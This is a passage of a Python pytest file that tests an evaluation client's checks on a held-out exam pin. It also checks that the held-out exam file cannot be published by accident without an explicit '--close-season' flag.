    monkeypatch.setitem(season.raw, "heldout_exam", {})
    client.check_heldout_pin(season, None, warn=said.append)
    assert len(said) == 3 and "no longer names one" in said[2]
    # None of which changes what this machine wrote down first.
    assert pinned()["sha256"] == committed and not list(client._pins().parent.glob("*.tmp*"))


def test_the_held_out_exam_is_not_published_by_a_slip_of_the_hand(monkeypatch, tmp_path, capsys):
    import hashlib

    from stet.spec import load_season

    season = load_season("s0")
    pack, other = tmp_path / "heldout-s0.jsonl.zst", tmp_path / "exam-pack.jsonl.zst"
    pack.write_bytes(b"the held-out exam")
    other.write_bytes(b"the public exam")
    monkeypatch.setitem(season.raw, "heldout_exam", {"sha256": hashlib.sha256(b"the held-out exam").hexdigest()})
    sent = []

    def request(method, path, body=None, key=None, raw=False, timeout=120, limit=0):
        sent.append(path)
        return {"sha256": hashlib.sha256(body).hexdigest(), "url": "http://files.test/" + path.rsplit("/", 1)[1]}

    monkeypatch.setattr(client, "request", request)
    key = client.create_key()
    key.handle = "anchor"
    key.save()

    class PublishArgs:
        name = None
        close_season = None
        season = "s0"

        def __init__(self, file, **over):
            self.file = str(file)
            self.__dict__.update(over)

    for args in (PublishArgs(pack), PublishArgs(pack, close_season="s1"), PublishArgs(pack, name="notes.txt")):  # whatever it is called
        with pytest.raises(SystemExit):
            client.cmd_publish(args)
        err = capsys.readouterr().err
        assert not sent and "cannot be taken back" in err and "--close-season s0" in err
    client.cmd_publish(PublishArgs(other))  # anything else is published as before
    client.cmd_publish(PublishArgs(pack, close_season="s0"))  # and this, when it is meant
    assert sent == ["/api/v1/admin/files/exam-pack.jsonl.zst", "/api/v1/admin/files/heldout-s0.jsonl.zst"]
